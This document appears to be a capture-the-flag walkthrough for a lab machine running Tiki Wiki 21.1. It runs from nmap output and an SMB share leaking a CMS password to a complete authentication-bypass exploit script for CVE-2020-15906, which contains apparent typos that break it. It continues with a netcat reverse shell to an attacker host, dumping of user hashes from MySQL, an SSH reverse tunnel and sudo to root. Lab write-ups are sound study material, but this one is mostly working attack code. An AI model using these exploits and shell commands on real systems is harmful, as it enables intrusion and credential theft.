https://github.com/ivanitlearning/Tiki-Wiki-15.1-unrestricted-file-upload/blob/master/tikiwiki_15.1_RCE.py

https://www.exploit-db.com/exploits/40053




```bash

└─$ sudo nmap -sT -A -Pn -n -T4 192.168.110.58
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-10-24 06:39 CEST
Nmap scan report for 192.168.110.58
Host is up (0.00021s latency).
Not shown: 996 closed ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 a3:d8:4a:89:a9:25:6d:07:c5:3d:76:28:06:ed:d1:c0 (RSA)
|   256 e7:b2:89:05:54:57:dc:02:f4:8c:3a:7c:55:8b:51:aa (ECDSA)
|_  256 fd:77:07:2b:4a:16:3a:01:6b:e0:00:0c:0a:36:d8:2f (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/tiki/
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
MAC Address: 08:00:27:8E:F0:3C (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: 1h59m58s
|_nbstat: NetBIOS name: UBUNTU, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-10-24T06:39:12
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.22 ms 192.168.110.58

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.09 seconds

```


```bash

$ enum4linux 192.168.110.58

$ smbclient //192.168.110.58/Notes -U silky
Enter WORKGROUP\silky's password:(enter)
smb: \> get Mail.txt

└─$ cat Mail.txt   
Hi Silky
because of a current Breach we had to change all Passwords,
please note that it was a 0day, we don't know how he made it.

Your new CMS-password is now 51lky571k1, 
please investigate how he made it into our Admin Panel.

Cheers Boss.

```

Tiki Version 21.1

```bash
curl http://192.168.110.58/tiki/changelog.txt

```
```bash

└─$ searchsploit tiki 21  
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Tiki Wiki CMS Groupware 21.1 - Authentication Bypass       | php/webapps/48927.py
----------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
Script exploit 

```py

#!/usr/bin/env/python3
import requests
import json
import lxml.html
import sys

banner = '''
Poof of Concept for CVE-2020-15906 by Maximilian Barz, Twitter: S1lky_1337
'''




def main():
    if(len(sys.argv) < 2):
        print(banner)
        print("Usage: %s <host> " % sys.argv[0])
        print("Eg:    %s 1.2.3.4 " % sys.argv[0])
        return


    rhost = sys.argv[1]
    url = "http://"+rhost+"/tiki/tiki-login.php"

    session = requests.Session()

    def get_ticket():
        r = requests.get(url)
        login_page = r.text.encode('utf-8')
        html = lxml.html.fromstring(login_page)
        auth = html.xpath('//input[@name="ticket"]/@value')

        return sfürtr(auth)[2:-2]

    def get_cookie():
        session.get(url)
        return session.cookies.get_dict()


    cookie = get_cookie()
    ticket = get_ticket()

    payload = {'ticket': ticket,'user':'admin', 'pass':'test','login':'','stay_in_ssl_mode_present':'y','stay_in_ssl_mode':'n'}
    headers = {
        'Host': rhost,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzrhost, deflate',
        'Referer': 'http://'+rhost+'/tiki/tiki-login.php',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Content-Length': '125',
        'Connection': 'close',
        'Upgrade-Insecure-Requests': '1',
        'Cache-Control': 'max-age=0',
    }


    for i in range(60):
        r = session.post(url, payload, headers)
        if("Account requires administrator approval." in r.text):
            print("Admin Password got removed.")
            print("Use BurpSuite to login into admin without a password ")



if(__name__ == '__main__'):
    main()

```

Reverse shell

Login as admin --> System Menu --> Scheduler --> Shell command --> mknod backpipe p; nc 192.168.110.1 443 0<backpipe | /bin/bash 1>backpipe --> Run now



```bash
cat local.php
<?php
$db_tiki='mysqli';
$dbversion_tiki='21.1';
$host_tiki='localhost';
$user_tiki='silky';
$pass_tiki='51lky571k1';
$dbs_tiki='tikiwiki';


mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "show tables" 2>&1
mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "describe users_users" 2>&1
mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "select email, login, hash from users_users" 2>&1
mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "select * from users_users" 2>&1
mysql -usilky -p51lky571k1 -hlocalhost tikiwiki -e "select valid from users_users" 2>&1

mysql -usilky -p51lky571k1 -hlocalhost -e "show databases" 2>&1
mysql -usilky -p51lky571k1 -hlocalhost Database -e "show tables" 2>&1

ssh -N -f -R 3306:127.0.0.1:3306 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null kali@192.168.110.1 -i key 2>&1

mysqldump -u silky -p  tikiwiki  > tikiwiki.sql

```

Found password silky:Agy8Y7SPJNXQzqA and get root


```bash

silky@ubuntu:~$ sudo -l
[sudo] Passwort für silky: 
Passende Defaults-Einträge für silky auf ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

Der Benutzer silky darf die folgenden Befehle auf ubuntu ausführen:
    (ALL : ALL) ALL
silky@ubuntu:~$ sudo su
root@ubuntu:/home/silky# id
root@ubuntu:/home/silky# 
uid=0(root) gid=0(root) Gruppen=0(root)


```
